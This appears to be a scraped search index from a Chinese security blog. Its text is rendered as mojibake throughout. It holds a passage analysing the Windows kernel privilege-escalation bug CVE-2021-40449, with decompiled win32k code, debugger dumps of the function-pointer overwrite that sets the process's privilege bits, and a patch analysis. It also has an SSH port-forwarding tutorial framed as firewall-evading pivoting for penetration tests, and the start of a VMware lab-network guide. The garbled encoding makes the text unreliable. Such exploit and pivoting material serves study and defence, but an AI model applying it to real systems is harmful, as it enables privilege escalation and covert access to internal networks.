†ï¼Œwin32kbase!Win32AllocPoolçš„a1å‚æ•°ä¸ºè¦ç”³è¯·çš„å †å†…å­˜å¤§å°ï¼Œè°ƒè¯•è¿‡ç¨‹ä¸­å¯ä»¥å¾—çŸ¥å…¶è¦ç”³è¯·0xe20å¤§å°çš„å †ï¼ŒåŠ ä¸Šå †å¤´ï¼Œåˆšå¥½æ¥è¿‘åˆšé‡Šæ”¾çš„0xe3å¤§å°çš„å †ç©ºé—´å¤§å°ã€‚\n__int64 __fastcall Win32AllocPool(__int64 a1, unsigned int a2) { unsigned int v2; // ebx __int64 v3; // rdi __int64 result; // rax v2 = a2; v3 = a1; if ( (signed int)IsWin32AllocPoolImplSupported_0() \u0026lt; 0 ) result = 0i64; else result = Win32AllocPoolImpl_0(33i64, v3, v2); return result; } åŒæ—¶åœ¨Pocä»£ç åˆ†æé‡Œé¢åˆ†æäº†DCå¯¹è±¡å‡½æ•°æŒ‡é’ˆå’Œå †å¤´ä¹‹é—´çš„ä½ç½®å…³ç³»ï¼Œæ‰€ä»¥é€šè¿‡æ„é€ ä¼ å…¥CreatePaletteçš„LOGPALETTEç»“æ„å¯ä»¥åˆšåˆšå¥½è¦†ç›–åŸDCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆä»¥åŠè¯¥å‡½æ•°æŒ‡é’ˆè¦è°ƒç”¨çš„å‚æ•°ï¼Œå†…å­˜åˆ†å¸ƒå…·ä½“è§https://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp é‡Œé¢çš„æ³¨é‡Šã€‚\né€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨RtlSetAllBitså‡½æ•°å¹¶ä¼ å…¥RtklBitMapå‹æŒ‡é’ˆï¼Œå…¶ä¸­RtlBitMapçš„bufferæŒ‡å‘POCè¿›ç¨‹è‡ªèº«çš„æƒé™ä½ï¼Œå¦‚ä¸‹å›¾ï¼š\ntypedef struct _RTL_BITMAP { ULONG SizeOfBitMap; ULONG *Buffer; } RTL_BITMAP, *PRTL_BITMAP; 0: kd\u0026gt; dq ffff885e80063000+0x750 // æ­¤å¤„ä¸ºRtlBitMapåœ°å€ ffff885e`80063750 ffffb48d`a3839010 ffffffff`ffffffff ffff885e`80063760 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063770 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063780 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063790 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637a0 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637b0 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637c0 ffffffff`ffffffff ffffffff`ffffffff 0: kd\u0026gt; dq ffffb48d`a3839010\t// æ­¤å¤„å­˜æ”¾äº†RtlBitMapç»“æ„ï¼Œ0x00-0x08ä¸ºsizeï¼Œ0x08-0x10ä¸ºbufferæŒ‡é’ˆï¼ŒæŒ‡å‘äº†è‡ªèº«çš„æƒé™ä½ ffffb48d`a3839010 00000000`00000080 ffffde8f`1fb2e9d0 ffffb48d`a3839020 41414141`41414141 41414141`41414141 ffffb48d`a3839030 00000000`00000000 00000000`00000000 ffffb48d`a3839040 00000000`00000000 00000000`00000000 ffffb48d`a3839050 00000000`00000000 00000000`00000000 ffffb48d`a3839060 00000000`00000000 00000000`00000000 ffffb48d`a3839070 00000000`00000000 00000000`00000000 ffffb48d`a3839080 00000000`00000000 00000000`00000000 0: kd\u0026gt; dq ffffde8f`1fb2e9d0 ffffde8f`1fb2e9d0 00000006`02880000 00000000`00800000 ffffde8f`1fb2e9e0 00000000`00800000 00000000`00000000 ffffde8f`1fb2e9f0 00000000`00000000 00000000`00000000 ffffde8f`1fb2ea00 20010000`00000000 0000000f`00000001 ffffde8f`1fb2ea10 000001e0`00000000 00000000`00001000 ffffde8f`1fb2ea20 00000000`00000000 ffffde8f`1fb2ee18 ffffde8f`1fb2ea30 00000000`00000000 ffffde8f`1f1007f0 ffffde8f`1fb2ea40 ffffde8f`1f1007f0 ffffde8f`1f10080c è°ƒç”¨DCé‡Œé¢çš„å‡½æ•°æŒ‡é’ˆä¹‹å‰ï¼Œè‡ªèº«æƒé™ä½ä¸ºæ­£å¸¸æƒé™ã€‚\nè°ƒç”¨å‡½æ•°æŒ‡é’ˆä¹‹åï¼Œå¯ä»¥çœ‹åˆ°æƒé™ä½å…¨éƒ¨ç½®ä¸ºäº†1\nè¡¥ä¸åˆ†æ åœ¨æ¼æ´åˆ©ç”¨åˆ†æé‡Œé¢åˆ†æè¿‡æ¼æ´å½¢æˆåŸå› æ˜¯å› ä¸ºåœ¨è°ƒç”¨GreResetDCInternalå‡½æ•°æ—¶ï¼Œä½¿ç”¨DCå¯¹è±¡æŒ‡é’ˆçš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥DCå¯¹è±¡æ˜¯å¦å¼‚å¸¸ã€‚è€Œåˆ©ç”¨è¯¥æ¼æ´æ˜¯é€šè¿‡åœ¨è°ƒç”¨å›è°ƒå‡½æ•°æ—¶è°ƒç”¨ResetDCå®ç°çš„ã€‚\næˆ‘ä»¬å†æ¬¡å›é¡¾ä¸€ä¸‹æ¼æ´å‡½æ•°ï¼Œåœ¨è°ƒç”¨hdcOpenDCWä¹Ÿå°±æ˜¯åœ¨è°ƒç”¨å›è°ƒå‡½æ•°ä¹‹å‰ä¼šé€šè¿‡DCOçš„æ„é€ å‡½æ•°ä»DCæ„é€ DCOå¯¹è±¡ï¼Œåœ¨åŸºæœ¬æ¦‚å¿µä¸­çŸ¥é“ï¼Œå†…æ ¸å¯¹è±¡æ¯è¢«å¼•ç”¨ä¸€æ¬¡åˆ™å¯¹è±¡å¼•ç”¨è®¡æ•°å™¨å€¼ä¼šåŠ ä¸€ã€‚è°ƒç”¨æ„é€ å‡½æ•°æ—¶ï¼ŒDCå¯¹è±¡å¼•ç”¨åŠ ä¸€ï¼Œæ­£å¸¸æƒ…å†µä¸‹æ­¤æ—¶DCå¯¹è±¡å¼•ç”¨æ¬¡æ•°è¦ä¸º1ã€‚å¦‚æœåœ¨å›è°ƒå‡½æ•°ä¸­å†æ¬¡è°ƒç”¨ResetDCï¼Œåˆ™ä¼šç¬¬äºŒæ¬¡è°ƒç”¨GreResetDCInternalï¼Œå†æ¬¡è°ƒç”¨DCOçš„æ„é€ å‡½æ•°ï¼ŒDCå¯¹è±¡å¼•ç”¨å†æ¬¡åŠ ä¸€ï¼Œæ­¤æ—¶å¼•ç”¨æ¬¡æ•°ä¸º2ã€‚\næ‰€ä»¥åˆ¤æ–­DCå¯¹è±¡å¼‚å¸¸å¯ä»¥é€šè¿‡åˆ¤æ–­DCå¯¹è±¡çš„å¼•ç”¨æ¬¡æ•°å®ç°ã€‚\n__int64 __usercall GreResetDCInternal@\u0026lt;rax\u0026gt;(HDC a1@\u0026lt;rcx\u0026gt;, __int64 a2@\u0026lt;rdx\u0026gt;, int *a3@\u0026lt;r8\u0026gt;) { __int64 v24; // [rsp+50h] [rbp-20h] __int64 v25; // [rsp+60h] [rbp-10h] DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v25, a1); // åˆ©ç”¨æ„é€ å‡½æ•°ä»HDCåˆ›å»ºDCOBJå¯¹è±¡ v8 = v25; Â·Â·Â·Â·Â·Â·Â·Â·Â·Â· v10 = *(_QWORD *)(v8 + 48);\t// èµ‹å€¼ *(_QWORD *)(v10 + 1736) = 0i64; v24 = v11; Â·Â·Â·Â·Â·Â·Â· v9 = *(_QWORD *)(v25 + 512) != 0i64; v12 = *(_DWORD *)(v25 + 120) \u0026gt; 0; Â·Â·Â·Â·Â·Â·Â· v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// åˆ›å»ºæ–°çš„DCå¯¹è±¡ï¼Œè¿”å›å¯¹åº”çš„HDCå¥æŸ„ if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));// è°ƒç”¨å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°ï¼Œä¼ å…¥å‚æ•°ä¸ºç”¨æˆ·ä¼ å…¥çš„HDCå¯¹åº”çš„DCå¯¹è±¡å†…çš„å€¼ Â·Â·Â·Â·Â·Â·Â· HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// äº¤æ¢æ—§çš„å’Œæ–°çš„HDCå¯¹è±¡ GreReleaseHmgrSemaphore(); Â·Â·Â·Â·Â·Â· bDeleteDCInternal(v6, 1i64, 0i64); // åˆ é™¤äº†hdcOpenDCWåˆ†é…çš„HDCï¼Œä½†å‰é¢ç»è¿‡HmgSwapLockedHandleContentsäº¤æ¢äº†å¥æŸ„ï¼Œå®é™…åˆ é™¤çš„æ˜¯æ—§çš„HDC Â·Â·Â·Â·Â·Â· åœ¨è¡¥ä¸ä¸­ï¼Œå¢åŠ äº†å¯¹DCå¯¹è±¡å¼•ç”¨æ¬¡æ•°è¿›è¡Œåˆ¤æ–­çš„é€»è¾‘ï¼Œå¦‚æœåœ¨GreResetDCInternalå‡½æ•°ä¸­DCå¯¹è±¡å¼•ç”¨æ¬¡æ•°å¤§äº1åˆ™è¡¨æ˜å·²ç»å‘ç”Ÿå¼‚å¸¸ï¼Œè¿›å…¥å¼‚å¸¸é€»è¾‘æŠ›å‡ºé”™è¯¯(å› ä¸ºæŒ‰æ­£å¸¸æµç¨‹æ­¤å¤„DCå¯¹è±¡å¼•ç”¨æ¬¡æ•°åº”ä¸ºä¸åº”è¯¥å¤§äº1)ã€‚\n__int64 __fastcall sub_1C014CB0C(__int64 a1, __int64 a2, int *a3) { ...... int *v30; // [rsp+30h] [rbp-1h] ..... v9 = (__int64)v30; if ( !v30 ) { LABEL_6: EngSetLastError(6i64); LABEL_7: v13 = (__int64)v30; goto LABEL_8; } if ( *((_WORD *)v30 + 6) \u0026gt; 1u ) { if ( *(_DWORD *)\u0026amp;stru_1C032C3F8.Length \u0026gt; 5u \u0026amp;\u0026amp; (unsigned __int8)sub_1C00B5068(\u0026amp;stru_1C032C3F8, 0x400000000000i64) ) { v31 = \u0026amp;v25; v30 = \u0026amp;v26; v29 = \u0026amp;v28; v28 = 0x1000000i64; SysEntryGetDispatchTableValues(v10, (__int64)\u0026amp;unk_1C02F466B, v11, v12); } goto LABEL_6; } å‚è€ƒé“¾æ¥ï¼š\nhttps://www.secrss.com/articles/35266\nhttps://mp.weixin.qq.com/s/AcFS0Yn9SDuYxFnzbBqhkQ\nhttps://bbs.pediy.com/thread-269930.htm\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/application-layer/ssh-tunnel/","title":"SSHéš§é“","tags":[],"description":"","content":"SSHéš§é“ SSHæä¾›äº†ä¸‰ç§è½¬å‘æ¨¡å¼ï¼šæœ¬åœ°ç«¯å£è½¬å‘ã€è¿œç¨‹ç«¯å£è½¬å‘ä»¥åŠåŠ¨æ€ç«¯å£è½¬å‘ï¼Œæœ¬æ–‡å°†ä»‹ç»è¿™ä¸‰ç§è½¬å‘æ¨¡å¼çš„ç”¨æ³•ã€‚\nä¸€äº›åŸºæœ¬æ¦‚å¿µ æœ¬åœ°ä¸»æœºï¼šSSHå®¢æˆ·ç«¯æ‰€åœ¨çš„ä¸»æœºã€‚\nè¿œç¨‹ä¸»æœºï¼šç›¸å¯¹äºæœ¬åœ°ä¸»æœºçš„æ¦‚å¿µï¼Œåœ¨æœ¬åœ°ä¸»æœºä¹‹å¤–çš„ä¸»æœºå«è¿œç¨‹ä¸»æœºã€‚\nSSHå‘½ä»¤è¡Œå‚æ•°è§£é‡Š\n-C:å‹ç¼©ä¼ è¾“ï¼Œæé«˜ä¼ è¾“é€Ÿåº¦ -f:å°†sshè½¬å…¥åå°æ‰§è¡Œ -N:å»ºç«‹é™é»˜è¿æ¥ï¼ˆè¿æ¥åçœ‹ä¸åˆ°å…·ä½“ä¼šè¯ï¼‰ -g:å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£ -L:æœ¬åœ°ç«¯å£è½¬å‘ -R:è¿œç¨‹ç«¯å£è½¬å‘ æœ¬åœ°ç«¯å£è½¬å‘ æœ¬åœ°ç«¯å£è½¬å‘ï¼Œå³å°†æœ¬åœ°ç«¯å£è½¬å‘åˆ°è¿œç¨‹ä¸»æœºä¸Šï¼Œå‘½ä»¤æ ¼å¼ï¼šssh -L \u0026lt;local port\u0026gt;:\u0026lt;remote host\u0026gt;:\u0026lt;remote port\u0026gt; \u0026lt;username\u0026gt;@\u0026lt;SSH hostname\u0026gt;\nä¸¾ä¾‹ï¼š\nSSH Client IP:x.x.x.x SSH Server IP:a.b.c.d åœ¨SSH Clientè¿è¡Œå‘½ä»¤ssh -CfNg -L 127.0.0.1:1313:127.0.0.1:1313 root@a.b.c.d ï¼Œå°†127.0.0.1:1313ç«¯å£è½¬å‘åˆ°SSH Serverçš„127.0.0.1:1313ç«¯å£ä¸Šã€‚æ­¤æ—¶SSH Clientè®¿é—®127.0.0.1:1313çš„ç»“æœè·Ÿè®¿é—®åœ¨SSH Serverç«¯çš„127.0.0.1:1313ç»“æœä¸€æ ·ã€‚\nåœ¨SSH Clientä¸Š\næ­¤æ—¶åœ¨SSH Clientä¸Šçš„sshä¼šç›‘å¬127.0.0.1:1313è¿™ä¸ªç«¯å£ï¼Œè¯¥ç«¯å£çš„TCPæ•°æ®é€šè¿‡sshéš§é“ä¼ è¾“åˆ°SSH serverä¸Šã€‚\nåœ¨SSH Serverä¸Šï¼Œå…ˆç›‘å¬127.0.0.1:1313ç«¯å£ï¼Œæœ¬æ–‡ç›‘å¬ä½¿ç”¨hugo å¯åŠ¨ä¸€ä¸ªserverã€‚\nåœ¨SSH Clientä¸Šä½¿ç”¨curl 127.0.0.1:1313å‘½ä»¤æ—¶è¿”å›çš„å†…å®¹å³ä¸ºSSH Serverä¸Š127.0.0.1:1313çš„å†…å®¹\nåŒæ—¶æœ¬åœ°ç«¯å£è½¬å‘å‘½ä»¤ä¸­remote ipä¸æ­¢é™åˆ¶åœ¨127.0.0.1ä¸Šï¼Œremote ipå¯ä»¥æ˜¯ä»»ä½•ä¸€ä¸ªSSH Serverèƒ½å¤Ÿè¿æ¥çš„hostï¼Œå®é™…ä¸Šæœ¬åœ°ç«¯å£è½¬å‘è¿‡ç¨‹ä¸­ï¼Œå®é™…ä¸Šæ˜¯æŠŠSSH Serverå½“ä½œè·³æ¿æœºï¼Œè¿é€šSSH Clientå’ŒSSH Serverå¦å¤–ä¸€ç«¯çš„ä¸»æœºï¼Œå¦‚ä¸‹ï¼š\n|SSH Client| \u0026lt;-------------\u0026gt;|SSH Server| \u0026lt;--------------\u0026gt;|SSH Clientä¸èƒ½è®¿é—®ä½†æ˜¯SSH Serverèƒ½è®¿é—®çš„ä¸»æœº|\næœ¬åœ°ç«¯å£è½¬å‘ä¸€èˆ¬åº”ç”¨åœºæ™¯ä¸ºåœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­æ§åˆ¶äº†ç›®æ ‡ç½‘ç»œä¸­å¸¦æœ‰SSH Serverçš„ä¸€å°æœºå™¨ï¼Œé€šè¿‡è¿™å°æœºå™¨åšä¸ºè·³æ¿æœºæ¥è®¿é—®å†…ç½‘å…¶ä»–ä¸»æœºä¸Šçš„æœåŠ¡ã€‚ä¸€å®šç¨‹åº¦ä¸Šè§„é¿é˜²ç«å¢™çš„æµé‡å‘Šè­¦ï¼ˆå› ä¸ºsshæµé‡ä¸ºåŠ å¯†æµé‡ï¼‰\nè¿œç¨‹ç«¯å£è½¬å‘ã€‚ è¿œç¨‹ç«¯å£è½¬å‘å³å’Œæœ¬åœ°ç«¯å£è½¬å‘æ˜¯ç›¸åçš„æ¦‚å¿µï¼Œæœ¬åœ°ç«¯å£è½¬å‘æ˜¯å°†æœ¬åœ°ç«¯å£è½¬å‘åˆ°è¿œç¨‹ç«¯å£ä¸Šï¼Œè¿æ¥æœ¬åœ°ç«¯å£å³è·Ÿè¿æ¥è¿œç¨‹ç«¯å£ä¸€ä¸ªæ•ˆæœã€‚è€Œè¿œç¨‹ç«¯å£è½¬å‘å³å°†è¿œç¨‹ç«¯å£è½¬å‘åˆ°æœ¬åœ°ï¼Œä½¿å¾—è¿æ¥è¿œç¨‹ç«¯å£å³è·Ÿè¿æ¥æœ¬åœ°ç«¯å£ä¸€æ ·ã€‚å‘½ä»¤æ ¼å¼ï¼šssh -R \u0026lt;remote port\u0026gt;:\u0026lt;local ip\u0026gt;:\u0026lt;local port\u0026gt; \u0026lt;username\u0026gt;@\u0026lt;SSH hostname\u0026gt;\nä¸¾ä¾‹ï¼š\nSSH Client IP:x.x.x.x SSH Server IP:a.b.c.d æœ¬æ¬¡æˆ‘ä»¬å°†SSH Clientçš„3389ç«¯å£è½¬å‘åˆ°SSH Serverï¼ˆå…¬ç½‘æœåŠ¡å™¨ï¼‰ä¸Šï¼Œä½¿å¾—å¦å¤–ä¸€å°æœºå™¨èƒ½å¤Ÿé€šè¿‡SSH Serverçš„ç«¯å£è¿æ¥åˆ°ä½äºå±€åŸŸç½‘çš„SSH Clientçš„è¿œç¨‹æ¡Œé¢ã€‚\nåœ¨ssh clientä¸Šè¿è¡Œå‘½ä»¤\næ­¤æ—¶ä»»ä½•è¿æ¥SSH Server:9898çš„è¯·æ±‚éƒ½ä¼šè¢«è½¬å‘åˆ°SSH Clientçš„58989ç«¯å£ä¸Šï¼Œè¯¥ç«¯å£ç›‘å¬çš„æœåŠ¡ä¸ºè¿œç¨‹æ¡Œé¢æœåŠ¡ã€‚åœ¨å¦å¤–ä¸€å°ç”µè„‘ï¼ˆä¸åŒäºSSH Serverå’ŒSSH Clientï¼‰ä½¿ç”¨è¿œç¨‹æ¡Œé¢è¿æ¥SSH Server:9898\nåŒæœ¬åœ°ç«¯å£è½¬å‘ä¸€æ ·ï¼Œè¿œç¨‹ç«¯å£è½¬å‘å‘½ä»¤ä¸­çš„local ipå¯ä»¥æ˜¯ä»»ä½•ä¸€ä¸ªSSH Clientèƒ½å¤Ÿè¿æ¥çš„hostï¼Œæ­¤æ—¶SSH Clientè¢«å½“ä½œè·³æ¿æœºï¼Œè¿é€šSSH Clientå¦å¤–ä¸€ç«¯å’ŒSSH Serverç«¯çš„ä¸»æœºã€‚\n|SSH Serveèƒ½å¤Ÿè¿é€šçš„ä¸»æœº| \u0026lt;--------------\u0026gt; |SSH Client| \u0026lt;--------------\u0026gt; |SSH Clientèƒ½è®¿é—®ä½†æ˜¯SSH Serverä¸èƒ½è®¿é—®çš„ä¸»æœº|\nè¿œç¨‹ç«¯å£è½¬å‘åº”ç”¨åœºæ™¯ä¸€èˆ¬æ˜¯å°†å±€åŸŸç½‘çš„æŸäº›æœåŠ¡é€šè¿‡SSHéš§é“æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œæˆ–è€…åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæ§åˆ¶äº†å†…ç½‘çš„æŸå°ä¸»æœºï¼Œé€šè¿‡è¿œç¨‹ç«¯å£è½¬å‘ï¼Œå°†è¯¥ä¸»æœºä½œä¸ºè·³æ¿æœºæ¥è®¿é—®å†…ç½‘å…¶ä»–æœåŠ¡ï¼Œå› ä¸ºæ­¤æ—¶SSHæ˜¯ä»å†…ç½‘è¿æ¥åˆ°å¤–ç½‘ï¼Œåœ¨æµé‡ä¸Šæ²¡æœ‰é‚£ä¹ˆå¯ç–‘ã€‚\nåŠ¨æ€ç«¯å£è½¬å‘ åœ¨æœ¬åœ°ç«¯å£è½¬å‘å’Œè¿œç¨‹ç«¯å£è½¬å‘è¿‡ç¨‹ä¸­ï¼Œä¸€æ¬¡æ€§åªèƒ½è½¬å‘ä¸€ä¸ªç«¯å£ï¼Œåœ¨æŸäº›åœºæ™¯ä¸‹æ•ˆç‡å¤ªä½äº†ï¼Œè€ŒåŠ¨æ€ç«¯å£è½¬å‘æ²¡æœ‰æŒ‡å®šç›®çš„ç«¯å£ï¼Œç›¸å¯¹äºå‰ä¸¤ç§æ¥è¯´æ›´çµæ´»ã€‚å®é™…ä¸ŠåŠ¨æ€ç«¯å£è½¬å‘å³ä¸ºSSHå®ç°çš„SOCKSåè®®ã€‚å‘½ä»¤æ ¼å¼:ssh -D port \u0026lt;username\u0026gt;@\u0026lt;SSH host\u0026gt;ã€‚\nåœ¨SSH Clientæ‰§è¡Œå‘½ä»¤å³å¯åœ¨SSH Clientå’ŒSSH Serverä¹‹é—´å»ºç«‹socks5éš§é“ï¼ŒSSH Clientå¯ä»¥è¿æ¥è¯¥éš§é“æ¥ä¼ è¾“æ•°æ®ã€‚\nç»„åˆåˆ©ç”¨ åœ¨ä¸€äº›æƒ…å†µä¸‹å¯ä»¥é€šè¿‡ç»„åˆä¸Šé¢ä¸‰ç§è½¬å‘æ¥è¾¾åˆ°æ„æƒ³ä¸åˆ°çš„æ•ˆæœã€‚\nä¾‹å¦‚ï¼Œæœ‰ä¸¤å°ä½äºäº’ä¸ç›¸é€šçš„å±€åŸŸç½‘ä¸»æœºï¼Œå¦‚æœä¸€å°æƒ³è¦è®¿é—®å¦å¤–ä¸€å°èƒ½å¤Ÿè®¿é—®çš„æœåŠ¡æ—¶ï¼Œå¯ä»¥ä»¥ä¸‹é¢çš„æ–¹å¼è¾¾åˆ°ç›®çš„\nåœ¨ä¸»æœº1ä¸Šæ‰§è¡Œå‘½ä»¤ ssh -CfNg -R 9898:192.168.50.1:22 root\u0026lt;SSH Server\u0026gt; å°†ä¸»æœº1çš„sshç«¯å£è½¬å‘åˆ°å…¬ç½‘æœåŠ¡å™¨çš„9898ç«¯å£ã€‚\nåœ¨ä¸»æœº2æ‰§è¡Œå‘½ä»¤ssh -D 12222 -p 9898 \u0026lt;username\u0026gt;@\u0026lt;SSH Server\u0026gt; æ­¤æ—¶sshè¿æ¥çš„æ˜¯ä¸»æœº1ï¼Œä¸”å»ºç«‹äº†sockséš§é“ï¼Œé€šè¿‡è¯¥éš§é“ä¸»æœº2å¯ä»¥æ–¹ä¾¿çš„ä½¿ç”¨ä¸»æœº1èƒ½è®¿é—®è€Œä¸»æœº2ä¸èƒ½ç›´æ¥è®¿é—®çš„æœåŠ¡ã€‚\n"},{"uri":"https://www.ch35tnut.site/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/","title":"åŸºäºVmwareçš„å°å‹åŸŸç½‘ç»œæ­å»º","tags":[],"description":"","content":"åŸºäºVmwareçš„å°å‹åŸŸç½‘ç»œæ­å»º æ‘˜è¦ åœ¨æ¸—é€çš„æ—¥å¸¸å­¦ä¹ è¿‡ç¨‹ä¸­ç»å¸¸éœ€è¦ä¸€ä¸ªå†…ç½‘ç¯å¢ƒï¼Œæœ¬ç¯‡æ–‡ç« ä»‹ç»å¦‚ä½•ä½¿ç”¨Vmwareå’ŒMikroTikæ­å»ºç®€æ˜“çš„äºŒå±‚å†…ç½‘ç¯å¢ƒã€‚\nç½‘ç»œç»“æ„ æ•´ä¸ªç½‘ç»œåˆ†ä¸ºç»“æ„åˆ†ä¸ºä¸‰å±‚ï¼Œç¬¬ä¸€å±‚æ¨¡æ‹Ÿå¤–ç½‘ç¯å¢ƒï¼Œç¬¬äºŒå±‚ä¸ºDMZåŒºåŸŸï¼Œè¯¥åŒºåŸŸé€šè¿‡è¾¹ç•Œè·¯ç”±å™¨çš„ç«¯å£æ˜ å°„ï¼Œå°†ç¬¬äºŒå±‚ç½‘ç»œä¸»æœºçš„ä¸€äº›ç«¯å£æ˜ å°„åˆ°è¾¹ç•Œè·¯ç”±å™¨ä¸Šå¯¹å¤–æä¾›æœåŠ¡ï¼Œç¬¬ä¸‰å±‚æ¨¡æ‹ŸåŠå…¬ç½‘ï¼Œè¯¥å±‚ç½‘ç»œä¸ºåŸŸç½‘ç»œï¼ŒåŒæ—¶å¯ä»¥æ§åˆ¶ç¬¬äºŒå±‚ç½‘ç»œçš„ä¸»æœºã€‚\næ•´ä¸ªç½‘ç»œæ‹“æ‰‘å›¾å¦‚ä¸‹ï¼š\nIPè®¾ç½®ï¼š\nç¬¬ä¸€å±‚ç½‘ç»œä¸ºï¼ˆå¤–ç½‘ï¼‰ï¼š192.168.59.0/24\nç¬¬äºŒå±‚ç½‘ç»œä¸ºï¼ˆDMZåŒºåŸŸï¼‰ï¼š192.168.72.0/24\nç¬¬ä¸‰å±‚ç½‘ç»œä¸ºï¼ˆåŠå…¬ç½‘ï¼‰ï¼š172.16.2.0/24\nè·¯ç”±å™¨IPåœ°å€ï¼š\nè¾¹ç•Œè·¯ç”±å™¨ï¼š192.168.59.141 | 192.168.72.2\nå†…ç½‘è·¯ç”±å™¨ï¼š192.168.72.254 | 172.16.2.254\nç½‘ç»œæ­å»º ç½‘ç»œè®¾ç½® é¦–å…ˆä½¿ç”¨VMwareçš„è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨å¢åŠ ä¸¤ä¸ªç½‘ç»œVMnet2ã€VMnet3ï¼Œéƒ½å‹¾é€‰ä»…ä¸»æœºæ¨¡å¼ï¼ŒåŒæ—¶å–æ¶ˆä¸‹é¢ä¸¤ä¸ªå‹¾ï¼Œå¦‚ä¸‹å›¾ï¼š\nVMnet3åŒç†ï¼ŒåŒæ—¶åœ¨DHCPè®¾ç½®å¤„è®¾ç½®ç›¸åº”çš„IPåœ°å€å’Œæ©ç ã€‚å…¶ä¸­å¤–å±‚ç½‘ç»œä¸ºnatæ¨¡å¼ï¼ŒVMnet2ä¸ºDMZåŒºåŸŸç½‘ç»œï¼ŒVMnet3ä¸ºåŠå…¬ç½‘ç»œ\nè™šæ‹Ÿæœºæ­å»º æ•´ä¸ªç½‘ç»œåœ¨æœ€å°‘æƒ…å†µä¸‹ä¸€å…±éœ€è¦å…­å°è™šæ‹Ÿæœºï¼Œåˆ†ä¸ºä¸¤å°ROSï¼Œå››å°ç½‘ç»œä¸­çš„ä¸»æœºã€‚\nROSä»hxxps://mikrotik.com/downloadä¸‹è½½stableç‰ˆæœ¬çš„ovaæ ¼å¼çš„é•œåƒï¼Œä¹‹åå¯¼å…¥åˆ°VMwareä¸­ã€‚ä¸€å…±éœ€è¦å¯¼å…¥ä¸¤æ¬¡ï¼Œåˆ†åˆ«å‘½åä¸ºROSï¼ŒROS-1ã€‚é™¤äº†ä¸‹è½½é•œåƒä¹‹å¤–è¿˜éœ€è¦ä¸‹è½½winboxæ–¹ä¾¿å¯¹è·¯ç”±å™¨è¿›è¡Œè®¾ç½®ã€‚\nç½‘ç»œä¸­ä¸»æœºåˆ†å¸ƒï¼š\nDMZï¼šUbuntu 2004ã€windows7\nåŠå…¬ç½‘ï¼šWindows server2019ã€windows7\nåˆ›å»ºä¸Šè¿°è™šæ‹Ÿæœºï¼Œå¹¶å°†DMZåŒºåŸŸçš„ä¸»æœºçš„ç½‘å¡è®¾ç½®ä¸ºVMnet2ï¼ŒåŠå…¬ç½‘çš„ä¸»æœºè®¾ç½®ä¸ºVMnet3.\nå°†è¾¹ç•Œè·¯ç”±å™¨ROSç½‘å¡è®¾ç½®ä¸ºnetæ¨¡å¼å’ŒVMnet2æ¨¡å¼ï¼Œå†…ç½‘è·¯ç”±å™¨è®¾ç½®ä¸ºVMnet2å’ŒVMnet3æ¨¡å¼ã€‚\nIPåœ°å€åŠè·¯ç”±å™¨è®¾ç½® ç»å†ä¸Šé¢çš„æ­¥éª¤ä¹‹åï¼ŒåŸºæœ¬çš„ç½‘ç»œæ‹“æ‰‘å·²ç»æ­å»ºå®Œæˆï¼Œæ¥ä¸‹æ¥éœ€è¦å¯¹ç½‘ç»œå†…çš„ä¸»æœºå’Œè·¯ç”±å™¨è¿›è¡Œè®¾ç½®ä½¿å¾—ç½‘ç»œä¸­çš„ä¸»æœºèƒ½å¤Ÿç›¸äº’pingé€šã€‚\né¦–å…ˆè®¾ç½®ä¸¤ä¸ªç½‘ç»œä¸­çš„ä¸»æœºIPåœ°å€\nDMZï¼š\nWindows7ï¼š192.168.72.4/24 ç½‘å…³192.168.72.2 DNS114.114.114.114\nUbuntu ï¼š192.168.72.3/24 ç½‘å…³192.168.72.2 DNS114.\n114.114.114\nåŠå…¬ç½‘ï¼š\nWindows server 2019ï¼š172.16.2.4/24 ç½‘å…³172.16. 2.254 DNS127.0.0.1\nwindows7ï¼š172.16.2.3/24 ç½‘å…³172.16.2.254 